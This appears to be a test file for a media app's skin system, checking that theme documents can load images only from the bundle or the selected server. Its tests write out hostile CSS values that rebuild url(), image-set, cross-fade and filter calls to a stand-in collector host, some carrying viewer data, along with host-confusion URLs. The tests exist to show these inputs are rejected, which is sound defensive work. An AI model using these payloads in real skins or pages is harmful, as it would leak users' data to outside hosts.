// A skin names images only as bundled assets, the server's appearance tree or catalogue artwork
// bindings, and the app loads them only from the selected server or the bundle. Values are checked
// as they will be drawn: after tokens, the document's strings and its name are filled in.
import { expect, test } from 'bun:test';
import { installedDocument } from '../src/installed';
import { fillRow, resolveDocument, type RNode } from '../src/resolve';
import { resolveAssetSource } from '../../../apps/vela/src/asset-source';
import type { SkinDocument } from '../../protocol/skin';

const origin = 'https://ether.test';
const base = { schema: 1, renderer: 18, id: 'owner', name: 'Owner', version: '1.0.0', swatches: ['#000000'], ui: {} };
const home = (node: unknown, extra: object = {}) => ({ ...base, ...extra, slots: { home: { type: 'box', style: {}, children: [node] } } });
const box = (style: Record<string, string>) => ({ type: 'box', style, children: [] });

function nodes(node: RNode | undefined, out: RNode[] = []): RNode[] {
  if (!node) return out;
  out.push(node);
  for (const child of (node as { children?: RNode[] }).children ?? []) nodes(child, out);
  if ('item' in node && node.item) nodes(node.item as RNode, out);
  return out;
}

test('a style cannot assemble an image URL from tokens, strings or the skin name', () => {
  const split = home(box({ 'background-image': '$a$b' }), { tokens: { a: 'ur', b: 'l(https://collector.example/a?v={env.viewer})' } });
  expect(() => installedDocument(split, origin)).toThrow();
  expect(() => resolveDocument(split as SkinDocument, 1440)).toThrow();
  const viaString = home(box({ 'background-image': 'u{s:u}' }), { strings: { en: { u: 'rl(https://collector.example/a)' } } });
  expect(() => installedDocument(viaString, origin)).toThrow();
  expect(() => resolveDocument(viaString as SkinDocument, 1440)).toThrow();
  const viaName = home(box({ 'background-image': 'u{env.skinName}' }), { name: 'rl(https://collector.example/a)' });
  expect(() => resolveDocument(viaName as SkinDocument, 1440)).toThrow();
});

test('no style row loads an image through another CSS function', () => {
  for (const [row, value] of [
    ['mask-image', "image-set('https://collector.example/c?v={env.viewer}' 1x)"],
    ['-webkit-mask-image', "-webkit-image-set('https://collector.example/c' 1x)"],
    ['background-image', "cross-fade(url(https://collector.example/c), linear-gradient(red, red))"],
    ['filter', 'url(https://collector.example/f.svg#x)'],
    ['mask-image', "image('https://collector.example/c')"],
  ]) {
    expect(() => resolveDocument(home(box({ [row!]: value! })) as SkinDocument, 1440)).toThrow();
  }
});

test('catalogue artwork as a background image and gradients still resolve', () => {
  expect(() => resolveDocument(home(box({ 'background-image': 'url({hero.backdrop})' })) as SkinDocument, 1440)).not.toThrow();
  expect(() => resolveDocument(home(box({ 'background-image': 'linear-gradient(#0000, #111), url({card.poster})' })) as SkinDocument, 1440)).not.toThrow();
  expect(() => installedDocument(home(box({ 'background-image': 'linear-gradient(180deg, #000, transparent)' })), origin)).not.toThrow();
  expect(() => resolveDocument(home(box({ 'background-image': 'url({env.query})' })) as SkinDocument, 1440)).toThrow();
});

test("the skin's name never becomes a bound image source", () => {
  const named = home({ type: 'image', src: '{env.skinName}' }, { name: 'https://collector.example/?{env.viewer}' });
  expect(() => installedDocument(named, origin)).toThrow();
  const doc = resolveDocument(named as SkinDocument, 1440);
  const image = nodes(doc.routes.home).find(n => n.kind === 'image') as Extract<RNode, { kind: 'image' }>;
  expect(typeof image.src).toBe('string');
  expect(image.src).not.toContain('{');
});

test('a bound style value draws no image unless it is a background image', () => {
  const env = { viewer: 'viewer-name' } as never;
  const bound = { parts: [() => "image-set('https://collector.example/c?v=viewer-name' 1x)"] };
  expect(fillRow('mask-image', bound, {} as never, env)).toBeUndefined();
  expect(fillRow('filter', { parts: [() => 'url(https://collector.example/f.svg#x)'] }, {} as never, env)).toBeUndefined();
  expect(fillRow('background-image', { parts: [() => 'cross-fade(url(https://collector.example/c), linear-gradient(red, red))'] }, {} as never, env)).toBeUndefined();
  expect(fillRow('background-image', { parts: ['url(', () => `${origin}/vela/v0/images/a?w=300`, ')'] }, {} as never, env)).toBe(`url(${origin}/vela/v0/images/a?w=300)`);
  expect(fillRow('background-color', { parts: [() => '#123456'] }, {} as never, env)).toBe('#123456');
  expect(fillRow('opacity', '0.5', {} as never, env)).toBe('0.5');
});

test('image sources load only from the bundle or the selected server', () => {
  const assets = { 'assets/brand/vela-lockup.svg': 7 };
  expect(resolveAssetSource('assets/brand/vela-lockup.svg', origin, assets)).toBe(7);
  expect(resolveAssetSource('/vela/v0/images/a?w=300', origin, assets)).toBe(`${origin}/vela/v0/images/a?w=300`);
  expect(resolveAssetSource(`${origin}/photo/:/transcode?url=%2Flibrary%2F1`, origin, assets)).toBe(`${origin}/photo/:/transcode?url=%2Flibrary%2F1`);
  expect(resolveAssetSource('http://media_server:8096/Items/1/Images/Primary', 'http://media_server:8096', assets)).toBe('http://media_server:8096/Items/1/Images/Primary');
  for (const foreign of ['https://collector.example/?viewer-name', 'https://ether.test.collector.example/a.png', 'https://ether.test@collector.example/a.png', 'http://ether.test/a.png', 'https://ether.test:8443/a.png', '//collector.example/a.png', 'data:image/svg+xml,<svg/>']) {
    expect(resolveAssetSource(foreign, origin, assets)).toBeUndefined();
  }
  expect(resolveAssetSource('https://collector.example/a.png', '', assets)).toBeUndefined();
});
